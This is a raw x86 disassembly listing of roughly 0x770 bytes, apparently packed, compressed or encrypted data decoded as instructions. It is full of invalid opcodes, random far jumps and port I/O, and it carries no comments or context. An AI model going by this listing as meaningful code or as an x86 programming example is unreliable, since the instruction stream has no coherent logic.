  41f5e7:	rcl    bl,0x54
  41f5ea:	push   edi
  41f5eb:	inc    esp
  41f5ec:	into   
  41f5ed:	std    
  41f5ee:	jle    0x41f5d0
  41f5f0:	test   DWORD PTR [esi+ecx*1],ebx
  41f5f3:	mov    ebx,0xf3aa89d3
  41f5f8:	jne    0x41f5c7
  41f5fa:	adc    al,BYTE PTR [edx]
  41f5fc:	add    eax,0xf3eb0809
  41f601:	mov    WORD PTR [ecx+ecx*4],cs
  41f604:	std    
  41f605:	test   al,0x7
  41f607:	or     eax,0xa5a9baf7
  41f60c:	imul   DWORD PTR [ebx+edi*4]
  41f60f:	sbb    ah,BYTE PTR [edx+0x4e448f45]
  41f615:	jae    0x41f628
  41f617:	push   ebp
  41f618:	es inc ebp
  41f61a:	jmp    0x1833:0xd35667e7
  41f621:	adc    al,0x8d
  41f623:	cld    
  41f624:	pushf  
  41f625:	(bad)
  41f628:	cmp    dl,ah
  41f62a:	add    BYTE PTR [ebp+0x4b],0x16
  41f62e:	xor    edx,DWORD PTR [esi]
  41f630:	push   esp
  41f631:	inc    edi
  41f632:	add    bl,BYTE PTR [ebp+0x67]
  41f635:	cld    
  41f636:	dec    ebp
  41f637:	xor    ah,ch
  41f639:	fbld   TBYTE PTR [ecx+0x4f]
  41f63c:	xchg   edx,eax
  41f63d:	jno    0x41f63f
  41f63f:	push   ebp
  41f640:	ror    BYTE PTR [edx+eiz*4],1
  41f643:	cmp    BYTE PTR [edx-0x26],ch
  41f646:	mov    cl,al
  41f648:	shr    BYTE PTR [edx-0x46c53a8],cl
  41f64e:	shr    DWORD PTR [ebx+0x38],0xad
  41f652:	push   cs
  41f653:	sub    BYTE PTR [edx-0x5c2153c6],dh
  41f659:	int3   
  41f65a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f65b:	pop    esi
  41f65c:	pop    esp
  41f65d:	xchg   esp,eax
  41f65e:	add    eax,0x37de3b0
  41f663:	jle    0x41f6d7
  41f665:	out    0x74,al
  41f667:	jp     0x41f677
  41f669:	or     esi,ebx
  41f66b:	xchg   esp,eax
  41f66c:	pusha  
  41f66d:	cdq    
  41f66e:	inc    ecx
  41f66f:	pop    eax
  41f670:	out    dx,al
  41f671:	imul   esp,DWORD PTR [edi],0xffffffe4
  41f674:	pop    ss
  41f675:	adc    DWORD PTR ds:0xca4a98,ecx
  41f67b:	daa    
  41f67c:	out    dx,al
  41f67d:	ret    
  41f67e:	cmp    ebx,edi
  41f680:	rcr    BYTE PTR [edx+0x5],cl
  41f683:	and    ch,BYTE PTR [edx+0x6c]
  41f686:	xor    eax,0xea8ebcd9
  41f68b:	cwde   
  41f68c:	lds    eax,FWORD PTR ds:0xfb4dbfdb
  41f692:	in     eax,dx
  41f693:	mov    WORD PTR [esi],?
  41f695:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f696:	and    ebx,DWORD PTR [ebx-0x26426d80]
  41f69c:	push   ebp
  41f69d:	pop    es
  41f69e:	mov    ds:0xb704ae93,eax
  41f6a3:	add    DWORD PTR [edi],ebp
  41f6a5:	mov    ds:0xec63d2e9,al
  41f6aa:	sahf   
  41f6ab:	xor    BYTE PTR [ebx],ch
  41f6ad:	(bad)  
  41f6ae:	mov    DWORD PTR [ecx+0x18a6c450],edi
  41f6b4:	xchg   BYTE PTR [ecx],dh
  41f6b6:	fcomp  QWORD PTR [esi+0x26b29f97]
  41f6bc:	cmc    
  41f6bd:	jecxz  0x41f678
  41f6bf:	fsubp  st(1),st
  41f6c1:	test   eax,0xcb270059
  41f6c6:	xchg   BYTE PTR ds:0x2481abb,al
  41f6cc:	(bad)  
  41f6cd:	stc    
  41f6ce:	jl     0x41f69d
  41f6d0:	cmc    
  41f6d1:	mov    dh,0xc2
  41f6d3:	lock sbb BYTE PTR [edi-0x31],dl
  41f6d7:	cli    
  41f6d8:	adc    dl,BYTE PTR [edi+0x15943203]
  41f6de:	mov    dl,0xb8
  41f6e0:	inc    ebx
  41f6e1:	fwait
  41f6e2:	and    bh,BYTE PTR [ebp+esi*4-0x31]
  41f6e6:	or     al,0x98
  41f6e8:	and    DWORD PTR ds:0xf89c020e,0x484f4a7
  41f6f2:	pop    ecx
  41f6f3:	mov    bh,BYTE PTR [edx]
  41f6f5:	fldenv [ebx]
  41f6f7:	out    dx,al
  41f6f8:	inc    ebx
  41f6f9:	(bad)  
  41f6fa:	mov    WORD PTR [edi+0x67],cs
  41f6fd:	adc    dh,dl
  41f6ff:	(bad)  
  41f700:	idiv   BYTE PTR [ebx*1+0x8a57dea]
  41f707:	inc    ebx
  41f708:	out    dx,eax
  41f709:	iret   
  41f70a:	pop    ss
  41f70b:	pusha  
  41f70c:	mov    esi,0xc72c162c
  41f711:	ret    0xe63e
  41f714:	jmp    0x41f708
  41f716:	jl     0x41f767
  41f718:	aaa    
  41f719:	add    eax,0x478caba0
  41f71e:	jnp    0x41f70f
  41f720:	clc    
  41f721:	mov    bl,0x5d
  41f723:	lea    eax,[esi]
  41f725:	xchg   esi,eax
  41f726:	sbb    esp,DWORD PTR [edx+0x50]
  41f729:	cmp    DWORD PTR [edx+0x4c975e51],0xfffffff5
  41f730:	mov    edx,0xc569592
  41f735:	das    
  41f736:	and    eax,0x27abdddf
  41f73b:	xchg   edi,eax
  41f73c:	sahf   
  41f73d:	fld    TBYTE PTR [edx+0x275761c7]
  41f743:	loop   0x41f712
  41f745:	in     eax,0x96
  41f747:	fnstcw WORD PTR [ebx+0x1cf95ab7]
  41f74d:	mov    ecx,0x4bbfac38
  41f752:	dec    ebp
  41f753:	loop   0x41f6ec
  41f755:	ds stos DWORD PTR es:[edi],eax
  41f757:	xor    BYTE PTR [edi+0x23bd61b1],0xfc
  41f75e:	add    dh,BYTE PTR [edx-0x29067ec0]
  41f764:	div    BYTE PTR [edi]
  41f766:	adc    al,0x9c
  41f768:	dec    edi
  41f769:	ja     0x41f73e
  41f76b:	dec    edx
  41f76c:	mov    esp,0x228551b8
  41f771:	ins    BYTE PTR es:[edi],dx
  41f772:	sub    BYTE PTR [eax],dl
  41f774:	dec    eax
  41f775:	ja     0x41f72c
  41f777:	int3   
  41f778:	cmp    BYTE PTR [edx+0x1c],ah
  41f77b:	or     al,0xb4
  41f77d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f77e:	sbb    ah,BYTE PTR [edi-0x1c]
  41f781:	dec    esp
  41f782:	jnp    0x41f7db
  41f784:	sub    al,0x27
  41f786:	push   cs
  41f787:	or     eax,0x9
  41f78a:	lock fild QWORD PTR [ebp-0x57b63406]
  41f791:	xchg   DWORD PTR [edi+0x34859ee3],ebx
  41f797:	pop    eax
  41f798:	push   eax
  41f799:	push   edx
  41f79a:	pop    edx
  41f79b:	jo     0x41f78a
  41f79d:	repnz cmp al,0x21
  41f7a0:	inc    esi
  41f7a1:	test   DWORD PTR [edx-0x5cdb7819],edi
  41f7a7:	jno    0x41f79a
  41f7a9:	lock dec edx
  41f7ab:	cmp    dl,BYTE PTR [eax]
  41f7ad:	xor    al,0xf4
  41f7af:	retf   
  41f7b0:	iret   
  41f7b1:	js     0x41f798
  41f7b3:	rol    bh,0x93
  41f7b6:	inc    edi
  41f7b7:	mov    ds:0x2b719d09,al
  41f7bc:	mov    ds:0xdf0e7ec3,al
  41f7c1:	mov    ah,0xca
  41f7c3:	(bad)  
  41f7c4:	sub    eax,0x8893e3e2
  41f7c9:	inc    ebx
  41f7ca:	xor    DWORD PTR [edi-0x4961de8f],esi
  41f7d0:	mov    eax,ds:0xfa8e0bca
  41f7d5:	jnp    0x41f7e3
  41f7d7:	daa    
  41f7d8:	jb     0x41f7b1
  41f7da:	mov    ds:0xe9d6211a,al
  41f7df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f7e0:	mov    cl,0x3
  41f7e2:	pop    ds
  41f7e3:	fs daa 
  41f7e5:	shl    bl,0xf
  41f7e8:	xor    esp,esi
  41f7ea:	cmp    eax,0x3011ddc0
  41f7ef:	cmp    eax,0xbf5a8950
  41f7f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f7f5:	test   eax,esi
  41f7f7:	ja     0x41f791
  41f7f9:	out    dx,eax
  41f7fa:	leave  
  41f7fb:	imul   ebp,DWORD PTR [eax+eiz*4-0x7ec070db],0xffffffcf
  41f803:	and    BYTE PTR [ecx-0x94c0b58],ch
  41f809:	pop    esi
  41f80a:	pop    ebp
  41f80b:	sar    eax,cl
  41f80d:	iret   
  41f80e:	repnz aas 
  41f810:	sub    DWORD PTR [eax-0x7a],ebp
  41f813:	mov    es,esi
  41f815:	or     bh,BYTE PTR [edi]
  41f817:	out    0x87,eax
  41f819:	jge    0x41f79f
  41f81b:	test   cl,dl
  41f81d:	js     0x41f887
  41f81f:	xchg   edi,eax
  41f820:	sub    DWORD PTR [esi+eax*1],ebx
  41f823:	daa    
  41f824:	jecxz  0x41f87b
  41f826:	jmp    0xc91bf123
  41f82b:	and    eax,0x86a0b880
  41f830:	xchg   esi,eax
  41f831:	mov    ch,0xf6
  41f833:	dec    edx
  41f834:	sub    al,0xd7
  41f836:	fsub   DWORD PTR [edi+edi*8+0x53aee76c]
  41f83d:	push   ds
  41f83e:	out    dx,al
  41f83f:	xor    ecx,DWORD PTR [ebx]
  41f841:	fiadd  WORD PTR [edi+0x70]
  41f844:	rcl    ebx,0xd6
  41f847:	les    ecx,FWORD PTR [ebx-0x1cfd50f]
  41f84d:	mov    esp,0x3c8b6eaa
  41f852:	xor    DWORD PTR [ebx],ebx
  41f854:	inc    ebx
  41f855:	stos   BYTE PTR es:[edi],al
  41f856:	xchg   esp,eax
  41f857:	dec    ecx
  41f858:	and    DWORD PTR [ebx],eax
  41f85a:	cld    
  41f85b:	jmp    0x41f87b
  41f85d:	dec    eax
  41f85e:	mov    ebp,0xf8413c82
  41f863:	adc    BYTE PTR [edi-0x665ffce8],0xd
  41f86a:	(bad)  
  41f86b:	arpl   WORD PTR [ecx-0x3],cx
  41f86e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f86f:	test   eax,0xbe47df4a
  41f874:	lods   al,BYTE PTR ds:[esi]
  41f875:	xor    ecx,ebx
  41f877:	ror    BYTE PTR [ecx],0x58
  41f87a:	pop    edx
  41f87b:	sub    al,0xae
  41f87d:	xor    esi,0x2f78318e
  41f883:	call   0x5cd:0xc6db9c1e
  41f88a:	iret   
  41f88b:	mov    cl,0x10
  41f88d:	jae    0x41f885
  41f88f:	adc    al,0x19
  41f891:	je     0x41f867
  41f893:	push   esi
  41f894:	xchg   esi,eax
  41f895:	outs   dx,DWORD PTR fs:[esi]
  41f897:	jl     0x41f8de
  41f899:	sub    DWORD PTR [ebx+esi*8-0x63aaf440],edi
  41f8a0:	test   DWORD PTR [edi-0x4a30a888],ecx
  41f8a6:	cdq    
  41f8a7:	xor    eax,0xaa606d27
  41f8ac:	pusha  
  41f8ad:	test   BYTE PTR [esi-0x46],al
  41f8b0:	ret    0x65e2
  41f8b3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f8b4:	int    0xe1
  41f8b6:	in     eax,0xbb
  41f8b8:	mov    dh,0x71
  41f8ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f8bb:	mov    edx,0xe896c3c
  41f8c0:	pop    eax
  41f8c1:	std    
  41f8c2:	dec    eax
  41f8c3:	jne    0x41f914
  41f8c5:	mov    ebx,0xd554113a
  41f8ca:	push   ebx
  41f8cb:	or     DWORD PTR [edi+0x5d],edi
  41f8ce:	rcr    DWORD PTR [ebp+0x29d54f9a],1
  41f8d4:	push   cs
  41f8d5:	pop    ebx
  41f8d6:	outs   dx,BYTE PTR ds:[esi]
  41f8d7:	dec    edx
  41f8d8:	rcr    al,cl
  41f8da:	sar    DWORD PTR [ecx],cl
  41f8dc:	imul   BYTE PTR [eax]
  41f8de:	mov    BYTE PTR [edi-0x3cf4245],cl
  41f8e4:	pop    eax
  41f8e5:	les    ecx,FWORD PTR [edx+0x255a8cb6]
  41f8eb:	mov    ch,0xa7
  41f8ed:	mov    ebx,0xb9ed4e45
  41f8f2:	je     0x41f8c7
  41f8f4:	xchg   ebx,eax
  41f8f5:	ret    
  41f8f6:	and    al,0xc1
  41f8f8:	clc    
  41f8f9:	mov    eax,ds:0x81394007
  41f8fe:	fmulp  st(4),st
  41f900:	and    dh,dh
  41f902:	adc    eax,0x6d5199e9
  41f907:	pusha  
  41f908:	jge    0x41f937
  41f90a:	and    al,bh
  41f90c:	(bad)  
  41f90d:	dec    BYTE PTR [ebx]
  41f90f:	rcr    BYTE PTR [ebp+0x2cef3d27],1
  41f915:	adc    eax,0xc8e423c1
  41f91a:	in     al,0x3e
  41f91c:	lock add ecx,DWORD PTR [eax]
  41f91f:	mov    esi,0xd9ecd179
  41f924:	pusha  
  41f925:	cmp    eax,0x6c7437b2
  41f92a:	or     DWORD PTR [edi],edi
  41f92c:	icebp  
  41f92d:	adc    BYTE PTR [eax-0x11b129c2],al
  41f933:	nop
  41f934:	rol    BYTE PTR [ebx+0x58],0xe2
  41f938:	jecxz  0x41f94c
  41f93a:	push   ecx
  41f93b:	sub    BYTE PTR [esi-0x4001fb8b],0x1
  41f942:	sub    BYTE PTR [ecx+0x11206c54],dl
  41f948:	pushf  
  41f949:	daa    
  41f94a:	jmp    0x41f9c7
  41f94c:	jmp    0xe41b:0x58679d47
  41f953:	daa    
  41f954:	sbb    BYTE PTR [ecx+0x31ac476],dl
  41f95a:	cmp    dl,dh
  41f95c:	cmp    al,BYTE PTR [esp+eax*1]
  41f95f:	ror    BYTE PTR [edx],1
  41f961:	push   esi
  41f962:	jns    0x41f8f8
  41f964:	in     eax,0x55
  41f966:	add    bh,BYTE PTR [ebp-0x40]
  41f969:	daa    
  41f96a:	ja     0x41f994
  41f96c:	inc    eax
  41f96d:	lahf   
  41f96e:	jb     0x41f928
  41f970:	jne    0x41f9c2
  41f972:	iret   
  41f973:	fadd   DWORD PTR [ebx]
  41f975:	les    ebp,FWORD PTR [esi+0x54]
  41f978:	add    DWORD PTR [edx+eax*4],0x65
  41f97c:	add    BYTE PTR [eax+0x173484fb],dh
  41f982:	popf   
  41f983:	stc    
  41f984:	jecxz  0x41fa01
  41f986:	int    0x58
  41f988:	inc    esi
  41f989:	or     esi,DWORD PTR [ebx*4-0x782bd58d]
  41f990:	sbb    BYTE PTR [edi-0x4902a811],0x1d
  41f997:	leave  
  41f998:	or     al,0xbf
  41f99a:	fld    DWORD PTR [ebp+0x46049f63]
  41f9a0:	mov    edi,0xae2dd121
  41f9a5:	sar    BYTE PTR [ebx+0x7a],cl
  41f9a8:	cmp    eax,0xd4c0dff9
  41f9ad:	(bad)  [edi-0xcab73e0]
  41f9b3:	repz (bad) 
  41f9b5:	mov    bl,0xcd
  41f9b7:	or     BYTE PTR [ebp+0x3a7b7a14],bh
  41f9bd:	xchg   edi,eax
  41f9be:	jbe    0x41f9cb
  41f9c0:	xchg   DWORD PTR ds:0x352dfc92,esp
  41f9c6:	std    
  41f9c7:	inc    edi
  41f9c8:	addr16 dec ebx
  41f9ca:	addr16 adc eax,0xf0ce1aaa
  41f9d0:	addr16 into 
  41f9d2:	shl    DWORD PTR [ebx],1
  41f9d4:	test   al,0x26
  41f9d6:	push   0xffffff8e
  41f9d8:	aas    
  41f9d9:	sbb    bh,dl
  41f9db:	dec    edx
  41f9dc:	clc    
  41f9dd:	ret    0x5513
  41f9e0:	xor    cl,dl
  41f9e2:	hlt    
  41f9e3:	outs   dx,BYTE PTR ds:[esi]
  41f9e4:	imul   edi,esp,0xffffffb0
  41f9e7:	std    
  41f9e8:	fwait
  41f9e9:	or     BYTE PTR [edi-0x6d],dh
  41f9ec:	bnd ret 
  41f9ee:	push   cs
  41f9ef:	and    BYTE PTR [edi-0x3b1756d8],al
  41f9f5:	xchg   ecx,eax
  41f9f6:	and    edx,DWORD PTR [edi+0x4]
  41f9f9:	xchg   edx,eax
  41f9fa:	stos   DWORD PTR es:[edi],eax
  41f9fb:	jge    0x41fa5c
  41f9fd:	data16 add dh,ah
  41fa00:	jl     0x41f9e5
  41fa02:	dec    edx
  41fa03:	lahf   
  41fa04:	sbb    eax,0x569b2275
  41fa09:	sbb    edx,esi
  41fa0b:	aad    0x77
  41fa0d:	repz (bad) 
  41fa0f:	and    al,BYTE PTR [ebx]
  41fa11:	jns    0x41fa26
  41fa13:	repnz dec esp
  41fa15:	push   es
  41fa16:	dec    ebx
  41fa17:	sahf   
  41fa18:	sub    ah,BYTE PTR [ecx]
  41fa1a:	lahf   
  41fa1b:	sbb    eax,DWORD PTR [edx]
  41fa1d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fa1e:	int    0xb1
  41fa20:	mov    cs,WORD PTR [eax]
  41fa22:	das    
  41fa23:	pop    ecx
  41fa24:	shr    bl,1
  41fa26:	(bad)  [edi+0x7515b183]
  41fa2c:	stos   DWORD PTR es:[edi],eax
  41fa2d:	test   DWORD PTR [edx+ecx*1-0x75bafa6a],edx
  41fa34:	popf   
  41fa35:	arpl   di,ax
  41fa37:	(bad)  
  41fa38:	jno    0x41fa22
  41fa3a:	ret    
  41fa3b:	xor    eax,0x23a67a70
  41fa40:	sbb    ebp,DWORD PTR [ebp+0x2385db09]
  41fa46:	push   edx
  41fa47:	ds call 0xd80f1b66
  41fa4d:	loop   0x41fa83
  41fa4f:	sbb    DWORD PTR [ebp+0x5f],eax
  41fa52:	pusha  
  41fa53:	popf   
  41fa54:	mov    ecx,0x5eeedc10
  41fa59:	loopne 0x41fa50
  41fa5b:	jno    0x41fa1e
  41fa5d:	call   0xc6f0:0x8f2db441
  41fa64:	call   FWORD PTR [edx+0x1384c708]
  41fa6a:	lea    ecx,[ebx+0x2c]
  41fa6d:	jb     0x41fa3e
  41fa6f:	daa    
  41fa70:	jae    0x41fa8d
  41fa72:	push   edx
  41fa73:	mov    dl,0x5a
  41fa75:	adc    al,BYTE PTR ds:0x1e1eb97a
  41fa7b:	push   cs
  41fa7c:	xor    al,0x94
  41fa7e:	or     eax,0x9f1e82d3
  41fa83:	test   eax,0x55c65142
  41fa88:	sub    al,0xcd
  41fa8a:	push   ds
  41fa8b:	inc    esp
  41fa8c:	xchg   esi,eax
  41fa8d:	sar    ah,0xab
  41fa90:	fdivr  DWORD PTR ds:0x4bda63f7
  41fa96:	scas   eax,DWORD PTR es:[edi]
  41fa97:	(bad)  
  41fa99:	mov    cl,0x49
  41fa9b:	adc    dh,0x74
  41fa9e:	and    al,0xc2
  41faa0:	call   0x3348:0x2d1c0969
  41faa7:	int3   
  41faa8:	dec    esi
  41faa9:	fld    QWORD PTR [edi]
  41faab:	fistp  QWORD PTR [edx+eax*1]
  41faae:	adc    al,BYTE PTR [ebx+eiz*8]
  41fab1:	shl    BYTE PTR [eax-0x3b],1
  41fab4:	mov    dl,0x53
  41fab6:	xor    DWORD PTR [esi+ebp*8-0x5f],edi
  41faba:	jmp    0x37c0:0x814c6067
  41fac1:	xor    eax,0xcbf490a4
  41fac6:	je     0x41fb26
  41fac8:	test   DWORD PTR [edi],edx
  41faca:	lea    ebp,[ecx+0x79]
  41facd:	jbe    0x41fa64
  41facf:	xchg   DWORD PTR [ebx+0x1db17cb],ebp
  41fad5:	or     BYTE PTR ds:0x512b511,bh
  41fadb:	lock dec ecx
  41fadd:	js     0x41fad4
  41fadf:	clc    
  41fae0:	std    
  41fae1:	xor    BYTE PTR [ecx+0x46],ah
  41fae4:	in     eax,dx
  41fae5:	shl    esi,cl
  41fae7:	pop    esp
  41fae8:	ins    DWORD PTR es:[edi],dx
  41fae9:	jno    0x41fad8
  41faeb:	fucompp 
  41faed:	cmp    ebx,ebx
  41faef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41faf0:	mov    ebp,0x27763045
  41faf5:	jae    0x41facf
  41faf7:	adc    ah,cl
  41faf9:	mov    esp,DWORD PTR [esi-0x48bf3e99]
  41faff:	inc    edi
  41fb00:	lods   al,BYTE PTR es:[esi]
  41fb02:	rol    cl,cl
  41fb04:	(bad)  
  41fb05:	xchg   ebx,eax
  41fb06:	fimul  WORD PTR [ecx]
  41fb08:	dec    eax
  41fb09:	scas   al,BYTE PTR es:[edi]
  41fb0a:	out    0x31,al
  41fb0c:	(bad)  
  41fb0d:	sbb    edx,DWORD PTR [edx-0x7a7e164a]
  41fb13:	in     eax,dx
  41fb14:	ins    BYTE PTR es:[edi],dx
  41fb15:	push   ebx
  41fb16:	cmp    al,0x24
  41fb18:	or     ch,BYTE PTR [ebx]
  41fb1a:	mov    ss,WORD PTR ds:0x3f7f7f59
  41fb20:	sub    DWORD PTR [esi],esp
  41fb22:	scas   al,BYTE PTR es:[edi]
  41fb23:	mov    DWORD PTR [ebp+0x31],edi
  41fb26:	or     eax,0x863e1aa1
  41fb2b:	sbb    edi,DWORD PTR [esi+0x274eaa59]
  41fb31:	hlt    
  41fb32:	mov    ebp,0xb2d0ba71
  41fb37:	cmp    eax,0xc22d3fe3
  41fb3c:	xchg   DWORD PTR [edi+0x46],esi
  41fb3f:	div    BYTE PTR [edx-0x4f]
  41fb42:	ret    0x653a
  41fb45:	f2xm1  
  41fb47:	jbe    0x41fb09
  41fb49:	int    0x82
  41fb4b:	mov    bh,BYTE PTR [ebp+0x47]
  41fb4e:	adc    BYTE PTR [ebx-0x2639d280],dl
  41fb54:	inc    ebx
  41fb55:	mov    bl,0xcc
  41fb57:	jne    0x41fb2e
  41fb59:	stos   DWORD PTR es:[edi],eax
  41fb5a:	test   eax,0xe43ae324
  41fb5f:	sub    DWORD PTR [edi+0x3e],esi
  41fb62:	and    BYTE PTR [ebx-0x68],cl
  41fb65:	es cld 
  41fb67:	mov    BYTE PTR [edx],bl
  41fb69:	cmc    
  41fb6a:	mov    bl,0xb5
  41fb6c:	inc    ecx
  41fb6d:	mov    dl,0x28
  41fb6f:	pcmpeqd mm7,QWORD PTR [edi+0x78]
  41fb73:	aas    
  41fb74:	daa    
  41fb75:	mov    edi,0x1eeae155
  41fb7a:	test   eax,0x1f517ff2
  41fb7f:	push   es
  41fb80:	push   ebx
  41fb81:	lods   al,BYTE PTR ds:[esi]
  41fb82:	outs   dx,BYTE PTR ds:[esi]
  41fb83:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41fb84:	ss push es
  41fb86:	mov    ds:0xc37f5d3a,al
  41fb8b:	xchg   DWORD PTR [edi+eax*4+0x4f],esi
  41fb8f:	rol    BYTE PTR [ebp+ebp*4+0x6b],0xe3
  41fb94:	xchg   ebx,eax
  41fb95:	adc    cl,bh
  41fb97:	shl    BYTE PTR [edi+0x43],1
  41fb9a:	sub    al,0x54
  41fb9c:	push   edi
  41fb9d:	ins    DWORD PTR es:[edi],dx
  41fb9e:	mov    ch,0xc1
  41fba0:	cmp    edi,DWORD PTR [esi]
  41fba2:	repz push 0xdd9ba8e
  41fba8:	mov    edx,0xe1cb9b7c
  41fbad:	adc    al,0xd2
  41fbaf:	cwde   
  41fbb0:	retf   0xf0b2
  41fbb3:	jecxz  0x41fbf1
  41fbb5:	dec    esp
  41fbb6:	add    DWORD PTR [eax-0x5],ecx
  41fbb9:	popa   
  41fbba:	jmp    0x2151:0x7d967251
  41fbc1:	stos   BYTE PTR es:[edi],al
  41fbc2:	push   es
  41fbc3:	push   es
  41fbc4:	cld    
  41fbc5:	test   DWORD PTR [esi-0x5b],ebx
  41fbc8:	jo     0x41fb96
  41fbca:	pop    esp
  41fbcb:	cs (bad) 
  41fbcd:	lds    edx,FWORD PTR [edx+0x3a890c3f]
  41fbd3:	push   edi
  41fbd4:	add    dh,bh
  41fbd6:	xor    eax,0xc597842e
  41fbdb:	int    0xc4
  41fbdd:	fnstcw WORD PTR [edx+eax*8-0x7a]
  41fbe1:	sbb    ch,BYTE PTR [edx-0x5d17f3e1]
  41fbe7:	or     eax,0xa3caa8cf
  41fbec:	inc    ebx
  41fbed:	mov    bl,0x4b
  41fbef:	sub    ebx,0xffffffea
  41fbf2:	dec    esp
  41fbf3:	test   eax,esp
  41fbf5:	jg     0x41fbbc
  41fbf7:	into   
  41fbf8:	fild   QWORD PTR [edi-0x7a]
  41fbfb:	jb     0x41fbb1
  41fbfd:	into   
  41fbfe:	or     bh,BYTE PTR [eax-0x505f1a28]
  41fc04:	mov    al,0xdf
  41fc06:	test   ebp,ebx
  41fc08:	push   edi
  41fc09:	sti    
  41fc0a:	cld    
  41fc0b:	fidiv  WORD PTR [edx+eax*4+0x7b]
  41fc0f:	xor    DWORD PTR [ecx+0x40c2e073],0x64
  41fc16:	pop    edx
  41fc17:	repnz mov bh,BYTE PTR [edi-0x75]
  41fc1b:	pusha  
  41fc1c:	inc    edx
  41fc1d:	int3   
  41fc1e:	sar    DWORD PTR [esi+edx*2],1
  41fc21:	loopne 0x41fc86
  41fc23:	pusha  
  41fc24:	repz dec ebx
  41fc26:	ss cdq 
  41fc28:	addr16 inc esi
  41fc2a:	int3   
  41fc2b:	leave  
  41fc2c:	mov    WORD PTR [ecx+0x5f],?
  41fc2f:	mov    edi,0x77ba63ae
  41fc34:	daa    
  41fc35:	push   ebp
  41fc36:	repz mov edx,0xdb2fc5e0
  41fc3c:	ins    BYTE PTR es:[edi],dx
  41fc3d:	jecxz  0x41fbc3
  41fc3f:	push   esp
  41fc40:	das    
  41fc41:	cwde   
  41fc42:	sar    DWORD PTR [eax-0x72],cl
  41fc45:	adc    eax,0x69e9c3db
  41fc4a:	adc    DWORD PTR [ebx-0x45],esi
  41fc4d:	repnz fiadd DWORD PTR [edi+0x18]
  41fc51:	inc    edx
  41fc52:	sub    bh,dh
  41fc54:	(bad)  
  41fc55:	gs dec ecx
  41fc57:	push   edx
  41fc58:	ror    DWORD PTR [edi-0x15a9122e],cl
  41fc5e:	cwde   
  41fc5f:	push   edi
  41fc60:	popf   
  41fc61:	mov    al,ds:0x7d847180
  41fc66:	xor    esp,DWORD PTR [eax+0x39539050]
  41fc6c:	ss cwde 
  41fc6e:	(bad)  [edx]
  41fc70:	xlat   BYTE PTR ds:[ebx]
  41fc71:	push   ecx
  41fc72:	adc    DWORD PTR [edx+edi*1+0x35200c30],eax
  41fc79:	or     esi,DWORD PTR [edi-0x30b5e5bf]
  41fc7f:	and    eax,0x1fb31481
  41fc84:	leave  
  41fc85:	mul    al
  41fc87:	out    0xaa,eax
  41fc89:	mov    edx,0xff164179
  41fc8e:	ret    
  41fc8f:	and    BYTE PTR [ecx+0x32],al
  41fc92:	and    al,0x32
  41fc94:	inc    ecx
  41fc95:	xchg   esp,eax
  41fc96:	retf   
  41fc97:	(bad)  
  41fc98:	sub    eax,0x3394f689
  41fc9d:	mov    ds:0x9fbd1c05,eax
  41fca2:	mov    ebx,0x22da8909
  41fca7:	scas   al,BYTE PTR es:[edi]
  41fca8:	lock cwde 
  41fcaa:	mov    ah,BYTE PTR [ecx]
  41fcac:	xchg   esi,eax
  41fcad:	adc    eax,0xe305976a
  41fcb2:	mov    bh,0x7a
  41fcb4:	xchg   DWORD PTR [ebx+0x42],esi
  41fcb7:	dec    edx
  41fcb8:	push   edx
  41fcb9:	ins    BYTE PTR es:[edi],dx
  41fcba:	fimul  WORD PTR ds:0x118baec8
  41fcc0:	xchg   ecx,eax
  41fcc1:	mov    es:0x6f5661df,al
  41fcc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41fcc8:	not    BYTE PTR [esi+ecx*8]
  41fccb:	outs   dx,BYTE PTR ds:[esi]
  41fccc:	fild   WORD PTR [edi+esi*1]
  41fccf:	and    bh,cl
  41fcd1:	pop    ds
  41fcd2:	test   BYTE PTR [edx+edi*1-0x380a13c8],al
  41fcd9:	js     0x41fcce
  41fcdb:	repz rol DWORD PTR [esi-0x68],cl
  41fcdf:	xchg   edx,eax
  41fce0:	(bad)  
  41fce2:	cmp    BYTE PTR [ebx+eiz*1+0x6c],al
  41fce6:	sub    DWORD PTR [esi+eax*4],edi
  41fce9:	fwait
  41fcea:	push   cs
  41fceb:	mov    dl,0xf3
  41fced:	xchg   BYTE PTR [edx-0x7f],cl
  41fcf0:	mov    dl,bl
  41fcf2:	popf   
  41fcf3:	mov    esp,0x5ad5820e
  41fcf8:	daa    
  41fcf9:	fistp  WORD PTR [edi+0x42e1d53a]
  41fcff:	and    al,0xa9
  41fd01:	or     ecx,DWORD PTR [ebx]
  41fd03:	iret   
  41fd04:	stc    
  41fd05:	test   BYTE PTR ds:0xa79999d1,0x2
  41fd0c:	xlat   BYTE PTR ds:[ebx]
  41fd0d:	out    0x83,al
  41fd0f:	test   DWORD PTR [edi-0x43cdb062],edx
  41fd15:	add    ch,bl
  41fd17:	dec    esi
  41fd18:	fisubr WORD PTR [ecx+0xe]
  41fd1b:	lea    ebp,[ebx+0x38]
  41fd1e:	dec    edx
  41fd1f:	stc    
  41fd20:	mov    edx,0x5d0646a8
  41fd25:	ss sti 
  41fd27:	pusha  
  41fd28:	sahf   
  41fd29:	mov    dl,0x5f
  41fd2b:	or     edx,edi
  41fd2d:	dec    eax
  41fd2e:	(bad)  
  41fd2f:	push   0x3ce630e4
  41fd34:	popf   
  41fd35:	paddusb mm2,QWORD PTR [ebx+0x44]
  41fd39:	xor    eax,0xe78dad55
  41fd3e:	jne    0x41fd2b
  41fd40:	xchg   ebp,eax
  41fd41:	sub    ch,ah
  41fd43:	and    BYTE PTR [edi+ebx*4+0x630d96ec],bh
  41fd4a:	cmp    cl,BYTE PTR [edx]
  41fd4c:	mov    dl,0x23
  41fd4e:	adc    BYTE PTR [ecx],0xe1
  41fd51:	iret   
  41fd52:	xlat   BYTE PTR ds:[ebx]
  41fd53:	xchg   esp,eax
  41fd54:	(bad)  
  41fd55:	cdq    
